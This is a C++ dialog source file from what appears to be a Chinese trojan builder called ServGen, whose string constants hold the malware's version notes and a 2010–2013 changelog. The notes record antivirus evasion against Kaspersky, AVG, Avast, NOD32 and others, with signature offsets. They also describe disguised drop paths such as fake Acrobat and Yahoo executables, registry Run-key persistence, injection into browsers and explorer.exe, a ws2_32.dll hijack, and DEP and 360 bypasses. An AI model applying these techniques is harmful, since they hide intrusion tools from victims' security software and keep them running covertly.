// ReadmeDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "ServGen.h"
#include "ReadmeDlg.h"

CString strVerInfo=_T("主版本：c\r\n\
次版本： \r\n\
释放路径：管理员权限 ---> c:\\windows\\system32\\msictl.exe；\r\n\
\t普通用户权限 --- > %USERPROFILE%\\Application Data\\update\\msictl.exe\r\n\
启动参数：-rpcss\r\n\
运行方式：插入默认浏览器\r\n\
启动方式：注册表RUN键下添加项\r\n");

CString strVerInfoB=TEXT("主版本：e\r\n\
次版本： \r\n\
运行方式：XP管理员权限 ---> 劫持explorer.exe；\r\n\
\t其他情况 --- > 插入默认浏览器\r\n\
");

CString strVerInfoC=TEXT("TODO:");

CString strUpdateInfo = TEXT("\
2013.07.19\r\n\
1.免杀:NOD32;Mcafee;AVG2013;小红伞8\r\n\
===============================================\r\n\
2013.07.01\r\n\
1.Avast 8.0免杀\r\n\
2.AVG 2013免杀\r\n\
===============================================\r\n\
2013.06.09\r\n\
1.Avast 8.0 免杀:入口位置及入口代码\r\n\
===============================================\r\n\
2013.06.04\r\n\
1.小红伞免杀\r\n\
2.Sophos免杀\r\n\
===============================================\r\n\
2013.05.23\r\n\
1.NOD32免杀\r\n\
===============================================\r\n\
2013.05.15\r\n\
1.AVG免杀\r\n\
2.修改了生成器崩溃的bug\r\n\
===============================================\r\n\
2013.04.25\r\n\
1.修改释放路径\r\n\
2.修改注册表名\r\n\
3.更换加密KEY\r\n\
4.修改其他暴露的特征\r\n\
===============================================\r\n\
2013.04.10\r\n\
1.卡巴斯基免杀\r\n\
2.域名加密\r\n\
===============================================\r\n\
2013.03.22\r\n\
1.修正了域名解析时程序崩溃的BUG\r\n\
===============================================\r\n\
2013.03.13\r\n\
1.修改为注入到默认浏览器\r\n\
2.手动解析域名\r\n\
3.在文件末尾添加随机数据\r\n\
===============================================\r\n\
2013.02.28\r\n\
1.Avast!免杀\r\n\
===============================================\r\n\
2013.02.25\r\n\
1.小红伞免杀(更换KEY)\r\n\
2.卡巴斯基免杀\r\n\
===============================================\r\n\
2013.02.17\r\n\
1.卡巴斯基2012免杀\r\n\
===============================================\r\n\
2013.01.24\r\n\
1.卡巴斯基2012免杀\r\n\
(诺顿还没改好)\r\n\
===============================================\r\n\
2013.01.15\r\n\
1.卡巴斯基2012免杀\r\n\
2.Avast7.0免杀\r\n\
===============================================\r\n\
2012.12.25\r\n\
1.AVG2013免杀(0x0000186B)\r\n\
2.卡巴斯基2012免杀\r\n\
===============================================\r\n\
2012.12.12\r\n\
1.Avast7.0免杀(0x00003AEE)\r\n\
2.卡巴斯基2012免杀\r\n\
===============================================\r\n\
2012.12.06\r\n\
1.AVG2013免杀(0x0000180B)\r\n\
===============================================\r\n\
2012.12.03\r\n\
1.NOD32免杀(更换KEY)\r\n\
===============================================\r\n\
2012.11.12\r\n\
1.AVG免杀(0x00001AA2)\r\n\
2.小红伞免杀\r\n\
===============================================\r\n\
2012.10.31\r\n\
1.AVG免杀(0x00000E1F)\r\n\
2.卡巴斯基2012免杀(CRT库+头+尾)\r\n\
===============================================\r\n\
2012.10.26\r\n\
1.增加了一些垃圾代码(混淆)\r\n\
===============================================\r\n\
2012.10.17\r\n\
1.卡巴斯基2012免杀(0x0000BADF)\r\n\
===============================================\r\n\
2012.10.05\r\n\
1.卡巴斯基2012免杀(0x0000BAE3)\r\n\
===============================================\r\n\
2012.09.18\r\n\
1.AVG免杀(0x00000DCF)\r\n\
===============================================\r\n\
2012.09.15\r\n\
1.avast!免杀(0x000036EE)\r\n\
===============================================\r\n\
2012.08.31\r\n\
1.卡巴斯基2012免杀(0x0000BAEB)\r\n\
2.avast!免杀(0x0000376E)\r\n\
===============================================\r\n\
2012.08.09\r\n\
1.增加网络设置\r\n\
2.AVG2012免杀\r\n\
3.avast!免杀\r\n\
===============================================\r\n\
2012.07.27\r\n\
1.小红伞免杀\r\n\
===============================================\r\n\
2012.07.17\r\n\
1.卡巴2012免杀(0x0000B4EB .reloc)\r\n\
===============================================\r\n\
2012.07.04\r\n\
1.eScanAV11.0免杀(0x00000284 : section header)\r\n\
2.卡巴2012免杀\r\n\
===============================================\r\n\
2012.06.27\r\n\
1.卡巴2012免杀(0x00001F17)\r\n\
2.修改了释放到当前用户目录时路径不正确的bug\r\n\
===============================================\r\n\
2012.06.08\r\n\
1.小红伞12.0免杀(0x00000E95)\r\n\
2.卡巴2012免杀\r\n\
===============================================\r\n\
2012.05.25\r\n\
1.增加\"可以不带参数\"选项.勾选后,不必使用参数-local也可启动\r\n\
===============================================\r\n\
2012.05.24\r\n\
1.修改了部分英文版xp下,以system用户启动时无法上线的BUG\r\n\
===============================================\r\n\
2012.05.21\r\n\
1.AVG2012免杀\r\n\
===============================================\r\n\
2012.05.08\r\n\
1.AVG2012免杀\r\n\
2.nod32免杀\r\n\
3.avast!免杀\r\n\
4.修改“服务端信息”\r\n\
===============================================\r\n\
2012.04.14\r\n\
1.合并3个项目，重写了配置过程\r\n\
===============================================\r\n\
2012.04.12\r\n\
1.修复木马释放时会删除自己的bug！\r\n\
===============================================\r\n\
2012.04.06\r\n\
1.仿PoisonIvy导出shellcode\r\n\
2.若有管理员权限，优先释放到系统目录下c:\\windows\\system32\\ymsgr_tray.exe\r\n\
否则释放到%USERPROFILE%\\Application Data\\Yahoo!\\ymsgr_tray.exe\r\n\
3.AGV2012，BitDefender免杀\r\n\
===============================================\r\n\
2012.03.05\r\n\
1.AVG2012免杀\r\n\
2.修改了写注册表自启动的一个BUG：若HKLM已写，则不再写HKCU\r\n\
===============================================\r\n\
2012.02.17\r\n\
1.avast!免杀\r\n\
2.卡巴2011免杀\r\n\
===============================================\r\n\
2012.02.14\r\n\
1.修改了服务端安装方式，能够运行多个服务端，后运行的将替换之前的\r\n\
===============================================\r\n\
2012.01.12\r\n\
1.修改了解析环境变量的方式，能够以SYSTEM用户运行\r\n\
2.自启动修改：在HKLM\......\RUN下添加项\r\n\
===============================================\r\n\
2012.01.06\r\n\
1.代码优化\r\n\
2.取消了互斥\r\n\
===============================================\r\n\
2011.12.18\r\n\
1.服务端带参才能启动 -local 需要和植入配合使用\r\n\
2.注册表自启动HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Reader\r\n\
3.服务端释放路径:%USERPROFILE%\\Application Data\\Acrobat\\read_sl.exe\r\n\
===============================================\r\n\
2011.11.28\r\n\
1.修正windows server 2003 下无法运行的bug\r\n\
===============================================\r\n\
2011.11.22\r\n\
1.修正kernel32 5.1.2600.5781 重映射的bug\r\n\
2.修改释放路径为%USERPROFILE%\\Application Data\\Acrobat\\read_sl.exe\r\n\
===============================================\r\n\
2011.11.11\r\n\
1.非windows7系统下AVG2011免杀（Win7+AVG2011仍然被杀）\r\n\
2.卡巴2011免杀\r\n\
3.小红伞免杀\r\n\
4.修改释放路径为%APPDATA%\\Acrobat\\winsrv.exe\r\n\
===============================================\r\n\
2011.09.12\r\n\
1.修改释放文件名为winserv.exe，修正了update关键字造成Vista、Win7弹UAC的问题（其他关键字：setup、install）\r\n\
===============================================\r\n\
2011.06.30\r\n\
1.修改了释放路径和文件名\r\n\
2.让宿主进程写注册表自启动\r\n\
3.域名加密\r\n\
===============================================\r\n\
2011.05.17\r\n\
1.卡巴2011中文版免杀\r\n\
2.修改释放路径\r\n\
3.修改了调用内存代码入口的参数\r\n\
===============================================\r\n\
2011.04.15\r\n\
1.绕过DEP保护(server 2003 默认 optin)\r\n\
2.服务端完成线程插入后退出进程\r\n\
===============================================\r\n\
2011.03.15\r\n\
1.卡巴2011免杀\r\n\
2.AVAST!免杀\r\n\
===============================================\r\n\
2011.02.14\r\n\
1.BKAV2011免杀\r\n\
2.卡巴2011免杀\r\n\
3.AVG9免杀\r\n\
4.NORTON免杀\r\n\
5.远程线程插入iexplorer.exe\r\n\
6.重写了生成器\r\n\
===============================================\r\n\
2010.11.12\r\n\
1.AVG9 免杀\r\n\
===============================================\r\n\
2010.09.26\r\n\
1.Avira免杀\r\n\
2.在输入表增加无用的函数\r\n\
3.删除基址查找代码（病毒特征）");

CString strUpdateInfoB=TEXT("\
2013.03.22\r\n\
1.修正了域名解析时程序崩溃的BUG\r\n\
===============================================\r\n\
2013.03.13\r\n\
1.Initial Release");


CString strUpdateInfoC=TEXT("\
2013.03.26\r\n\
1.Beta");

CString strDllInfo=TEXT("\
DLL木马运行方法\r\n\
1.通过DllMain正常调用实现木马功能\r\n\
2.改名为ws2_32.dll通过劫持实现木马功能\r\n\
注意：从DllMain进入，调用者必须是winword.exe或者wordpad.exe或者verclsid.exe");

CString strDllUpdate=TEXT("\
2012.05.21\r\n\
1.更新DLL劫持木马与现有控制端匹配\r\n\
2.AVG2012等免杀\r\n\
===============================================\r\n\
2012.04.09\r\n\
1.Avast!免杀\r\n\
===============================================\r\n\
2012.02.??\r\n\
1.增加DllMain入口，调用者必须是winword.exe或者wordpad.exe或者verclsid.exe\r\n\
===============================================\r\n\
2011.04.??\r\n\
1.为绕过360主动防御，制作DLL劫持木马\r\n\
===============================================\r\n\
");

CString strSvchostInfo=TEXT("\
控守型木马(测试版)说明:\r\n\
通过注册为svchost进程共享服务实现启动\r\n\
\r\n\
注意事项:\r\n\
1.不要与现有端口相同\r\n\
2.需要管理员权限\r\n\
3.Win7无法使用\r\n\
");

CString strSvchostUpdate=TEXT("\
\r\n\
");

// CReadmeDlg 对话框

IMPLEMENT_DYNAMIC(CReadmeDlg, CDialog)

CReadmeDlg::CReadmeDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CReadmeDlg::IDD, pParent)
	, m_strReadMe(_T(""))
{
	
}

CReadmeDlg::~CReadmeDlg()
{
}

void CReadmeDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT_README, m_strReadMe);
	DDX_Control(pDX, IDC_EDIT_README, m_editReadMe);
}


BEGIN_MESSAGE_MAP(CReadmeDlg, CDialog)
END_MESSAGE_MAP()


// CReadmeDlg 消息处理程序

BOOL CReadmeDlg::OnInitDialog(void)
{
	switch (dwFlag)
	{
	case SHOW_UPDATE:
		{
			this->SetWindowText(_T("更新说明A"));
			m_strReadMe=strUpdateInfo;
		}
		break;
	case SHOW_VERINFO:
		{
			this->SetWindowText(_T("版本说明A"));
			m_strReadMe=strVerInfo;
		}
		break;
	case SHOW_VERINFOB:
		{
			this->SetWindowText(TEXT("版本说明B"));
			m_strReadMe=strVerInfoB;
		}
		break;
	case SHOW_UPDATEB:
		{
			this->SetWindowText(TEXT("更新说明B"));
			m_strReadMe=strUpdateInfoB;
		}
		break;
	case SHOW_UPDATEC:
		{
			this->SetWindowText(TEXT("更新说明C"));
			m_strReadMe=strUpdateInfoC;
		}
		break;
	case SHOW_VERINFOC:
		{
			this->SetWindowText(TEXT("版本说明C"));
			m_strReadMe=strVerInfoC;
		}
		break;
	default:
		break;
	}

	
	UpdateData(FALSE);


	return TRUE;
}
